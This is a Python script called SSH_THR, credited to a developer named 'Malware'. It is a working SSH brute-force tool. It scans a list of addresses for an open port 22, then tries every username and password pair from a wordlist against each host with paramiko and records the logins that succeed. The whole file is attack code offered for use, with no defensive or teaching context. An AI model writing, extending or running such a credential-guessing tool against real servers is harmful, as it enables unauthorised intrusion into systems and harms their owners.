#SSH_THR | Build Version 1.4 | - No Potential Errors Currently | Possible Fixes {Regarding Class}
import paramiko 
import time 
from colorama import Fore 
import threading 
from pyfiglet import figlet_format 
import os 
import socket

def end_count():
	time.sleep(1)
	if len(validatt) >= 1:
		print(Fore.GREEN + 'Valid Connections: %s - Invalid Connections: %s' %(len(validatt),len(invalidatt)))
	else:
		print(Fore.GREEN + 'Valid Connections: %s - Invalid Connections: %s' %(len(validatt),len(invalidatt)))
		print(Fore.RED + 'There Appears To Be No Valid Connection Attempts - Restarting...')
		validation_second()

def try_ssh_bruteforce():
	time.sleep(1)
	op1 = open(l,'r').readlines()
	global validatt 
	validatt = []
	global invalidatt
	invalidatt = []
	aclient = paramiko.client.SSHClient()
	aclient.set_missing_host_key_policy(paramiko.AutoAddPolicy)
	port = 22
	for i in valid_addr_list:
		for d1 in op1:
			spl = d1.split(':')
			try:
				aclient.connect(i,22,spl[0].strip(),spl[1].strip())
				print(Fore.GREEN + 'Valid Attempt On %s:%s with %s:%s' %(i,port,spl[0],spl[1]))    # < -- Requires Fixing
				validatt.append('%s:%s - %s:%s - CON ' %(i,port,spl[0],spl[1]))
			except Exception:
				print(Fore.RED + 'Invalid Attempt On %s:%s with %s:%s' %(i,port,spl[0],spl[1]))
				invalidatt.append('%s:%s - %s:%s - CONERR' %(i,port,spl[0],spl[1]))
	time.sleep(1)
	end_count()

def collect_formatted_wordlist():
	time.sleep(1)
	print(Fore.RED + 'Wait! We Need Your Wordlist | Format User and Pass As Seen | (root:root) (demo:password)')
	cri = 0
	global l 
	l = input('ssh@thr:~$ ')
	fn = '.txt'
	if fn in l:
		cri += 1
	else:
		pass
	if os.path.exists(os.path.abspath(l)):
		cri += 1
	else:
		pass
	if cri == 2:
		return True
	else:
		return False

def collect_user_data():
	if collect_formatted_wordlist():
			print(Fore.GREEN + 'Valid Wordlist File | %s |' %(l))
			try_ssh_bruteforce()
	else:
			print(Fore.RED + "List %s Invalid | List Either Doesn't Exist Or Isn't Formatted To .txt |" %(l))
			collect_user_data()

def try_addr_list_con(addr):
	global valid_addr_list
	valid_addr_list = []
	global invalid_addr_list
	invalid_addr_list = []
	op = open(addr,'r').readlines()
	for i in op:
		try:
			s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			s.connect((i,22))
			valid_addr_list.append(i)
		except Exception:
			invalid_addr_list.append(i)
	time.sleep(1)
	if len(valid_addr_list) < 1:
		print(Fore.RED + 'ADDR_LIST_STATE | Valid ADDRS: %s | Invalid ADDRS: %s | ' %(len(valid_addr_list),len(invalid_addr_list)))
		print(Fore.RED + "Restarting... 0 Valid ADDRS")
		validation_second()
	else:
		print(Fore.GREEN + 'ADDR_LIST_STATE | Valid ADDRS: %s | Invalid ADDRS: %s | ' %(len(valid_addr_list),len(invalid_addr_list)))
		time.sleep(1)
		print(Fore.GREEN + 'Trying | %s | Valid ADDRS ' %(len(valid_addr_list)))
		collect_user_data()

def enter_dir():
	try:
		print(Fore.RED + 'Enter Directory Name, Not Path (Enter Filename Second)')
		enter_d = input(Fore.RED + 'ssh@thr:~$ ')
		check_for_file = input(Fore.RED + 'ssh@thr:~$ ')
	except KeyboardInterrupt:
		print(Fore.RED + '|SSH_THR| - Closing.. |')
		time.sleep(1.5)
		exit()
	firstpath = os.path.abspath(__file__)
	flen = len(firstpath) - len(__file__)
	fp = firstpath[:flen]
	dd = str(fp) + str(enter_d)
	global return_f
	return_f = []
	for i in os.listdir(dd):
		if check_for_file == i:
			os.chdir(dd)
			print(Fore.GREEN + 'ADDR_LIST | %s | Is Valid' %(check_for_file))
			try_addr_list_con(check_for_file) 
		else:
			print(Fore.RED + 'ADDR_LIST | %s | Is Invalid' %(check_for_file))
			time.sleep(1)
			validation_second()
	
						
def validate_addr_list(addr):
	fp = os.path.abspath(str(addr))
	if os.path.exists(fp):
		return True
	else:
		return False

def validation_second():
	print(Fore.RED + 'Please Enter Your Address List, Format to .txt')
	print(Fore.RED + "PUT THIS PY FILE IN THE DIRECTORY OF YOUR LIST OR ENTER D FOR A DIFFERENT DIR")
	global addrlist
	addrlist = input(Fore.RED + "ssh@thr:~$ ")
	if addrlist == 'd':
		enter_dir()
	else:
		pass
	if validate_addr_list(addrlist):
		print(Fore.GREEN + 'ADDR_LIST | %s | Is Valid' %(addrlist))
		try_addr_list_con(addrlist) 
	else:
		print(Fore.RED + 'ADDR_LIST | %s | Is Invalid' %(addrlist))
		time.sleep(1)
		validation_second()


def banner():
	time.sleep(1)
	print(Fore.RED + figlet_format('		                     SSH_THR',font='bubble'))
	print(Fore.LIGHTBLACK_EX + """
    		========================================
		Project Developer: Malware
		Version: 1.4
		Please Enter The Name Of Your Addr List
		========================================
				""")
	validation_second()

if __name__ == '__main__':
	banner()
